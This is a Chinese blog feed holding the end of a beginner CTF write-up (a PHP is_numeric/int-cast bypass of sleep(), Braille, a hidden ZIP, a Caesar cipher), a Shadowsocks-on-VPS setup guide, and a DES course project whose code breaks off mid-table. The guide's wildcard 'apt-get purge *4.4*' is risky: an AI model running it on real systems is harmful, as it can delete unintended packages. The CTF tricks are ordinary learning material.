alt="Fga60S.png"></a></p><p>然后发现执行强制类型转换的时候，<code>先识别前面的数字，到不是数字的字符为止，如果第一个值就不是数字，那强制转换的结果就为0</code></p><p>所以这题先识别到GET到的参数<code>6e6</code>是一个数字字符，通过is_numberic函数的验证，然后强制类型转化的时候，转化为了<code>int(6)</code>,所以只需要等待6秒即可得到flag</p><p><code>drops{2018_ctf_zhongyuangong_xiaosai}</code></p><p><strong>attention</strong>这题还可以通过构造16进制数的方法来绕过sleep()函数,原理一致。</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="你了解我么"><a href="#你了解我么" class="headerlink" title="你了解我么"></a>你了解我么</h3><p>点进去一看是一张海伦凯勒的图片，应该就是盲文没错了……</p><p>百度一波解出盲文为<code>kmdonowg</code>，使用py的MD5加密得到flag<code>drops{8aa5b596bf284a6dd446f9e141b47861}</code></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="图书馆"><a href="#图书馆" class="headerlink" title="图书馆"></a>图书馆</h3><p>这题拿到直接放进hex编辑器看了一下文件尾部有pk，证明里面有压缩包</p><p><a href="https://imgchr.com/i/Fg15y4" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/25/Fg15y4.png" alt="Fg15y4.png"></a></p><p>直接将后缀改为zip解压，得到一个2.txt文件，打开发现一堆乱码，但看到<strong>IDHR</strong>想到是png文件的文件头，就直接将后缀改为png，果然得到一张图片；</p><p><a href="https://imgchr.com/i/Fg1OfK" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/25/Fg1OfK.png" alt="Fg1OfK.png"></a></p><p><code>qebcf{nfqs25kjps8rjsi8kfqnfp42kizaoip}</code>有点奇怪……</p><p>但是根据上面的经验所有的flag都是以<strong>drops</strong>开头的，所以想到是凯撒移位加密，用工具解密得到flag</p><p><a href="https://imgchr.com/i/Fg8S3T" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/25/Fg8S3T.png" alt="Fg8S3T.png"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;emmmm……学长说挺适合新手的，就拿来做了做，发现还是可以学习一波的。
    
    </summary>
    
      <category term="Writeup" scheme="https://gardenia30.top/categories/Writeup/"/>
    
    
      <category term="CTF" scheme="https://gardenia30.top/tags/CTF/"/>
    
      <category term="Writeup" scheme="https://gardenia30.top/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>DigitalOcean+PuTTY+SS如何撸梯子</title>
    <link href="https://gardenia30.top/2018/12/22/DigitalOcean+PuTTY+SS%E5%A6%82%E4%BD%95%E6%92%B8%E6%A2%AF%E5%AD%90/"/>
    <id>https://gardenia30.top/2018/12/22/DigitalOcean+PuTTY+SS如何撸梯子/</id>
    <published>2018-12-22T13:34:39.000Z</published>
    <updated>2018-12-23T03:46:54.703Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一直拿VPN翻墙超级卡，于是下定决心用了大半天时间撸了个梯子，感谢隔壁磊哥（巨佬）的热心帮助！<a id="more"></a></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="购买VPS"><a href="#购买VPS" class="headerlink" title="购买VPS"></a>购买VPS</h2><p>早就听说有github学生包这个优惠活动，就提前申请了一波，一个edu邮箱就可以了，免费拿到digital ocean的50美元优惠兑换码，接着直接就可以创建DO的账户，从我的链接进去直接注册就可以免费赠送10刀<a href="https://m.do.co/c/091768c54a8a" target="_blank" rel="noopener">click here</a>，创建账户的前提就是充值5刀，折合35块吧，够我用一年了,非常划算。</p><p>总共拿到55美刀，买了个美国旧金山的服务器，5刀一个月，1TB流量，unbuntu系统，感觉还行，感觉后来速度也不错，推荐购买。</p><p>买了以后会发给你账户原始密码，直接进入Droplets页面进行设置，Launch Console进入命令行，输入原始密码进行登录，修改密码即可</p><p><img src="https://s1.ax1x.com/2018/12/22/FydSxK.png" alt="img"></p><h2 id="下载PuTTY"><a href="#下载PuTTY" class="headerlink" title="下载PuTTY"></a>下载PuTTY</h2><p>和隔壁小敏子（另一个巨佬）要了个PuTTY的包直接就安装好了，打开以后直接输入IP等一系列信息就可以直接登上去</p><p><img src="https://s1.ax1x.com/2018/12/22/FydBdJ.png" alt="img"></p><p>PuTTY是一个Telnet、SSH、rlogin、纯TCP以及串行接口连接软件，可以直接连接上我的VPS，当然Xshell也是一个不错的选择。</p><h2 id="配置VPS"><a href="#配置VPS" class="headerlink" title="配置VPS"></a>配置VPS</h2><p>1.build-essential安装</p><p>linux操作系统上面开发程序，光有了gcc 是不行的它还需要一个build-essential软件包作用是提供编译程序必须软件包的列表信息，也就是说 编译程序有了这个软件包，它才知道 头文件在哪 才知道库函数在哪，还会下载依赖的软件包   最后才组成一个开发环境，当然 build-essential包 安装时 需要的依赖包 有些你用不上  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install build-essential</span><br></pre></td></tr></table></figure><p>2.安装pip</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install python-pip</span><br></pre></td></tr></table></figure><p>3.安装shadowsocks</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install shadowsocks</span><br></pre></td></tr></table></figure><p>4.更新软件列表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure><p>5.配置shadowsocks</p><p>linux自带了神器vim编辑器，学习一波用法<a href="http://www.runoob.com/linux/linux-vim.html" target="_blank" rel="noopener">我是链接啊啊啊！</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/shadowsocks.json</span><br></pre></td></tr></table></figure><p>新建ss配置文件，输入以下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;server&quot;:&quot;::&quot;,</span><br><span class="line">&quot;server_port&quot;: 选一个端口就好,</span><br><span class="line">&quot;local_port&quot;: 1080,</span><br><span class="line">&quot;timeout&quot;:300,</span><br><span class="line">&quot;password&quot;: &quot;yourpassword&quot;,</span><br><span class="line">&quot;method&quot;:&quot;aes-256-cfb&quot;,</span><br><span class="line">&quot;fast_open&quot;:true,</span><br><span class="line">&quot;workers&quot;:1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>:wq保存退出就好，此时已经完成了对ss的配置。</p><p>6.在VPS上运行shadowsocks</p><p>输入以下命令，看见started就好</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssserver -c /etc/shadowsocks.json -d start</span><br></pre></td></tr></table></figure><p>7.本地接入ss</p><p>唉~移动网络真的是垃圾的一批，进github都要那么久，在github上down了一个shadowsocks.exe下来，输入刚刚配置的信息点击确定，打开启用系统代理即可</p><p>8.第八条专门用来吐槽我的今天的经历，真的是无f**k可说，经过千辛万苦连接上了ss但没想到访问不了Google，但是连我的手机热点和舍友的无线就可以，真的是……唉~算了，自己慢慢解决吧，终于查到了问题所在，我是直接插光纤上网的，而ss的启动系统代理默认的是给你打开局域网设置的代理，所以我**的忙活了那么久竟然是一个如此低端的问题，我还以为是我的ss配置错了……下面是解决办法。</p><h2 id="安装配置SwitchyOmega"><a href="#安装配置SwitchyOmega" class="headerlink" title="安装配置SwitchyOmega"></a>安装配置SwitchyOmega</h2><p>这是一个Google的插件，专门用来设置代理</p><p>不多说，扔两张图：</p><p><strong>全局代理设置：</strong></p><p><img src="https://s1.ax1x.com/2018/12/22/FywqhR.png" alt="img"></p><p><strong>PAC模式设置：</strong></p><p><img src="https://s1.ax1x.com/2018/12/22/Fywjc6.png" alt="img"></p><p>PAC设置的PAC网址就是打开局域网设置里面的脚本地址，填入以后应用，更新即可，PAC唯一的好处就是走国内的可以快一点，节省一点流量。</p><h2 id="BBR算法提速"><a href="#BBR算法提速" class="headerlink" title="BBR算法提速"></a>BBR算法提速</h2><p>不多说，速度还是挺慢的，需要Google发布的TCP BBR算法，给我的vps提一波速，Linux4.9的内核已经支持TCP BBR了。</p><p>1.先查看内核版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/version</span><br></pre></td></tr></table></figure><p>2.如果不够，将内核升级到4.9.10,先下载安装包；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.9.10/linux-image-4.9.10-040910-generic_4.9.10-040910.201702141931_amd64.deb</span><br></pre></td></tr></table></figure><p>3.安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -i linux-image-4.9.10-040910-generic_4.9.10-040910.201702141931_amd64.deb</span><br></pre></td></tr></table></figure><p>4.查看当前有哪些内核</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -l | grep linux-image</span><br></pre></td></tr></table></figure><p>5.删除旧的内核(我的是4.4)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get purge *4.4*</span><br></pre></td></tr></table></figure><p>6.更新引导</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update-grub</span><br></pre></td></tr></table></figure><p>7.重启</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reboot</span><br></pre></td></tr></table></figure><p>8.编辑sysctl.conf文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/sysctl.conf</span><br></pre></td></tr></table></figure><p>在末尾添加如下两行后保存</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net.core.default_qdisc=fq</span><br><span class="line">net.ipv4.tcp_congestion_control=bbr</span><br></pre></td></tr></table></figure><p>9.执行如下操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sysctl -p           #使配置生效</span><br><span class="line"></span><br><span class="line">lsmod | grep bbr</span><br></pre></td></tr></table></figure><p>出现tcp_bbr即可，证明提速已经生效</p><p>10.刚刚已经重启了一次，所以要再次将shadowsocks在vps上跑起来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssserver -c /etc/shadowsocks.json -d start</span><br></pre></td></tr></table></figure><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>现在我终于花了一天时间撸好了我的梯子……以后终于可以不受我大天朝网络封锁带来的影响，尽情遨游网络世界了，也希望这对以后的学习可以有所帮助。不说了，继续撸密码学了……</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;一直拿VPN翻墙超级卡，于是下定决心用了大半天时间撸了个梯子，感谢隔壁磊哥（巨佬）的热心帮助！
    
    </summary>
    
      <category term="VPS" scheme="https://gardenia30.top/categories/VPS/"/>
    
    
      <category term="my vps" scheme="https://gardenia30.top/tags/my-vps/"/>
    
  </entry>
  
  <entry>
    <title>密码学课程设计之DES对称加密</title>
    <link href="https://gardenia30.top/2018/12/19/%E5%AF%86%E7%A0%81%E5%AD%A6%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1%E4%B9%8BDES%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/"/>
    <id>https://gardenia30.top/2018/12/19/密码学课程设计之DES对称加密/</id>
    <published>2018-12-19T00:08:56.000Z</published>
    <updated>2019-01-13T13:07:32.217Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在进行密码学课程设计，<a id="more"></a>感觉拿python进行设计会显得比较简洁易懂，本人python比较渣渣，所以就拿出来练一练。用零零碎碎的时间写了五六天才把主干部分写完，真是菜哭我自己了。在此还需要感谢一叶飘零学长的博客，遇到困惑时果然飘零学长的博客就是最好的去处。</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="加密原理"><a href="#加密原理" class="headerlink" title="加密原理"></a>加密原理</h2><p><img src="https://s2.ax1x.com/2019/01/03/FoEdsg.md.png" alt="FoEdsg.md.png"></p><h3 id="密钥生成"><a href="#密钥生成" class="headerlink" title="密钥生成"></a>密钥生成</h3><p>1.输入8位字符密钥转换为64位二进制；</p><p>2.经过64位密钥经过PC-1置换为56位；</p><p>3.将56位分成两部分分别进行循环左移；</p><p>4.左移后组合，再进入PC-2置换为48位，第一轮密钥生成结束；</p><p>5.循环左移以后的两部分继续循环左移，再次进入PC-2置换，生成48位子密钥，如此进行16轮，存储16个48位的子密钥</p><h3 id="加密处理"><a href="#加密处理" class="headerlink" title="加密处理"></a>加密处理</h3><p>1.输入的字符先转换为二进制，每64位为一组进行加密；</p><p>2.每一组64位的二进制先进行IP置换打乱；</p><p>3.然后将64位分成2部分，分别放入Li和Ri</p><p>4.将Ri经过F函数处理，再与Li异或，然后将值赋给R(i+1)</p><p>5.将Ri赋值给L(i+1)</p><p>6.最后一轮，直接将Ri赋给R(i+1),再将Ri经过F函数处理，再与Li异或，然后将值赋给L(i+1)</p><p>7.将L和R合并后经过逆IP盒，得到密文C</p><h3 id="F函数"><a href="#F函数" class="headerlink" title="F函数"></a>F函数</h3><p>1.先将输入的32位Ri进行扩展置换E，转换为48位</p><p>2.再与生成的子密钥进行异或</p><p>3.将异或后的值经过S盒压缩为32位</p><p>4.再进行P置换打乱顺序</p><h2 id="加密详细过程"><a href="#加密详细过程" class="headerlink" title="加密详细过程"></a>加密详细过程</h2><h3 id="各个置换dict"><a href="#各个置换dict" class="headerlink" title="各个置换dict"></a>各个置换dict</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">dic_IP=[<span class="number">58</span>,<span class="number">50</span>,<span class="number">42</span>,<span class="number">34</span>,<span class="number">26</span>,<span class="number">18</span>,<span class="number">10</span>,<span class="number">2</span>,<span class="number">60</span>,<span class="number">52</span>,<span class="number">44</span>,<span class="number">36</span>,<span class="number">28</span>,<span class="number">20</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">62</span>,<span class="number">54</span>,<span class="number">46</span>,<span class="number">38</span>,<span class="number">30</span>,<span class="number">22</span>,<span class="number">14</span>,<span class="number">6</span>,<span class="number">64</span>,<span class="number">56</span>,<span class="number">48</span>,<span class="number">40</span>,<span class="number">32</span>,<span class="number">24</span>,<span class="number">16</span>,<span class="number">8</span>,<span class="number">57</span>,<span class="number">49</span>,<span class="number">41</span>,<span class="number">33</span>,<span class="number">25</span>,<span class="number">17</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">59</span>,<span class="number">51</span>,<span class="number">43</span>,<span class="number">35</span>,<span class="number">27</span>,<span class="number">19</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">61</span>,<span class="number">53</span>,<span class="number">45</span>,<span class="number">37</span>,<span class="number">29</span>,<span class="number">21</span>,<span class="number">13</span>,<span class="number">5</span>,<span class="number">63</span>,<span class="number">55</span>,<span class="number">47</span>,<span class="number">39</span>,<span class="number">31</span>,<span class="number">23</span>,<span class="number">15</span>,<span class="number">7</span>]</span><br><span class="line"></span><br><span class="line">dic_key1=[<span class="number">57</span>,<span class="number">49</span>,<span class="number">41</span>,<span class="number">33</span>,<span class="number">25</span>,<span class="number">17</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">58</span>,<span class="number">50</span>,<span class="number">42</span>,<span class="number">34</span>,<span class="number">26</span>,<span class="number">18</span>,<span class="number">10</span>,<span class="number">2</span>,<span class="number">59</span>,<span class="number">51</span>,<span class="number">43</span>,<span class="number">35</span>,<span class="number">27</span>,<span class="number">19</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">60</span>,<span class="number">52</span>,<span class="number">44</span>,<span class="number">36</span>,<span class="number">63</span>,<span class="number">55</span>,<span class="number">47</span>,<span class="number">39</span>,<span class="number">31</span>,<span class="number">23</span>,<span class="number">15</span>,<span class="number">7</span>,<span class="number">62</span>,<span class="number">54</span>,<span class="number">46</span>,<span class="number">38</span>,<span class="number">30</span>,<span class="number">22</span>,<span class="number">14</span>,<span class="number">6</span>,<span class="number">61</span>,<span class="number">53</span>,<span class="number">45</span>,<span class="number">37</span>,<span class="number">29</span>,<span class="number">21</span>,<span class="number">13</span>,<span class="number">5</span>,<span class="number">28</span>,<span class="number">20</span>,<span class="number">12</span>,<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">dic_key2=[<span class="number">14</span>,<span class="number">17</span>,<span class="number">11</span>,<span class="number">24</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">28</span>,<span class="number">15</span>,<span class="number">6</span>,<span class="number">21</span>,<span class="number">10</span>,<span class="number">23</span>,<span class="number">19</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">26</span>,<span class="number">8</span>,<span class="number">16</span>,<span class="number">7</span>,<span class="number">27</span>,<span class="number">20</span>,<span class="number">13</span>,<span class="number">2</span>,<span class="number">41</span>,<span class="number">52</span>,<span class="number">31</span>,<span class="number">37</span>,<span class="number">47</span>,<span class="number">55</span>,<span class="number">30</span>,<span class="number">40</span>,<span class="number">51</span>,<span class="number">45</span>,<span class="number">33</span>,<span class="number">48</span>,<span class="number">44</span>,<span class="number">49</span>,<span class="number">39</span>,<span class="number">56</span>,<span class="number">34</span>,<span class="number">53</span>,<span class="number">46</span>,<span class="number">42</span>,<span class="number">50</span>,<span class="number">36</span>,<span class="number">29</span>,<span class="number">32</span>]</span><br><span class="line"></span><br><span class="line">dic_e=[<span class="number">32</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">32</span>,<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">dic_s=[[<span class="number">14</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">15</span>,<span class="number">11</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">11</span>,<span class="number">15</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">12</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">10</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">13</span>],[<span class="number">15</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">14</span>,<span class="number">6</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">3</span>,<span class="number">13</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">15</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">14</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">15</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">11</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">14</span>,<span class="number">9</span>],[<span class="number">10</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">14</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">14</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">15</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">15</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">15</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">12</span>],[<span class="number">7</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">15</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">7</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">14</span>],[<span class="number">2</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">13</span>,<span class="number">0</span>,<span class="number">14</span>,<span class="number">9</span>,<span class="number">14</span>,<span class="number">11</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">10</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">15</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">14</span>,<span class="number">11</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">13</span>,<span class="number">6</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">3</span>],[<span class="number">12</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">9</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">13</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">11</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">15</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">14</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">13</span>],[<span class="number">4</span>,<span class="number">11</span>,<span class="number">2</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">3</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">12</span>,<span class="number">2</span>,<span class="number">15</span>,<span class="number">8</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">14</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">9</span>,<span 